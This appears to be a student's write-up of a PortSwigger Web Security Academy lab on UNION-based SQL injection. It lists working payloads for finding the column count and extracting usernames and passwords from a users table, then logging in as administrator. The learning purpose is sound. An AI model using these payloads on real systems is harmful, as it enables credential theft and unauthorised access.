# 🛡️ Lab: SQL Injection UNION Attack – Retrieving Data from Other Tables

## 📌 Platform

* PortSwigger Web Security Academy

---

## 🎯 Objective

Retrieve usernames and passwords from the **users** table using a UNION-based SQL injection and log in as the administrator.

---

# 🔍 Step 1: Identify SQL Injection

### 🧪 Test

```sql
'
```

### 🔍 Observation:

* Page returned an error

### 📌 Conclusion:

* SQL injection is possible

---

# 🧪 Step 2: Determine Number of Columns

### 🧪 ORDER BY Method

```sql
' ORDER BY 1--+
' ORDER BY 2--+
' ORDER BY 3--+
```

### 🔍 Observation:

* Works up to 2
* Error on 3

### 📌 Conclusion:

* Query returns **2 columns**

---

### 🧪 UNION Confirmation

```sql
' UNION SELECT NULL,NULL--+
```

✔ Worked → column count confirmed

---

# 🧠 Step 3: Use Provided Information

From lab description:

* Table name:

```text
users
```

* Column names:

```text
username
password
```

👉 No need for enumeration in this lab

---

# ⚠️ Important Correction

Incorrect attempt:

```sql
' UNION SELECT NULL,NULL FROM 'users'--+
```

❌ Wrong because:

* Table names should NOT be in quotes
* `'users'` is treated as a string, not a table

---

# 🎯 Step 4: Extract Data from Table

### 🧪 Final Payload

```sql
' UNION SELECT username,password FROM users--+
```

---

### ✅ Result:

* Retrieved multiple usernames and passwords
* Included administrator credentials

---

# 🔓 Step 5: Login as Administrator

* Used extracted admin credentials
* Successfully logged in
* Lab solved

---

# 🧠 Key Learnings

* UNION requires:

  * Same number of columns
  * Compatible data types
* Table names are NOT quoted in SQL
* Lab may directly provide:

  * table name
  * column names
* UNION can be used to extract data from other tables

---

# 🛠️ Payload Summary

### Injection Test

```sql
'
```

### Find Columns

```sql
' ORDER BY 1--+
' ORDER BY 2--+
```

### Confirm UNION

```sql
' UNION SELECT NULL,NULL--+
```

### Extract Data

```sql
' UNION SELECT username,password FROM users--+
```

---

# 📌 Conclusion

This lab demonstrates how to:

1. Confirm SQL injection
2. Determine column count
3. Use UNION to extract data from another table
4. Use extracted credentials for authentication

👉 This is the first full **data extraction attack using UNION SQL injection**

---

